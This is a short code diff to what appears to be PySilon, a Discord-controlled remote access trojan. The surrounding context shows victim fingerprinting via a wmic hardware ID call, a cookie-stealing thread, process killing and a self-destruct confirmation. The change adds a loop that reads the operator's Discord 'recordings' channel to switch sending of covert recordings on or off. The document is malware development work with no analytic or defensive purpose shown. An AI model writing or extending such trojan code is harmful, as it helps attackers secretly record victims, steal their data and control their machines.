@@ -28,6 +28,7 @@ import discord
 import asyncio
 import sys
 import os
+import time
 auto = 'auto'
 
 #
@@ -73,14 +74,15 @@ messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
-
+send_recordings = True
+latest_messages_in_recordings = []
 # [pysilon_var] !registry 0
 
 working_directory = ['C:', 'Users', getuser(), software_directory_name]
 
 @client.event
 async def on_ready():
-    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread
+    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
     hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
 
     first_run = True
@@ -146,6 +148,16 @@ async def on_ready():
 # [pysilon_var] !recording_startup 1
     
     while True:
+        global send_recordings
+        recordings_obj = client.get_channel(channel_ids['recordings'])
+        async for latest_message in recordings_obj.history(limit=2):
+            latest_messages_in_recordings.append(latest_message.content)
+        if 'disable' in latest_messages_in_recordings:
+            send_recordings = False
+        else:
+            send_recordings = True
+
+        latest_messages_in_recordings = []
         if len(messages_to_send) > 0:
             for message in messages_to_send:
                 await client.get_channel(message[0]).send(message[1])
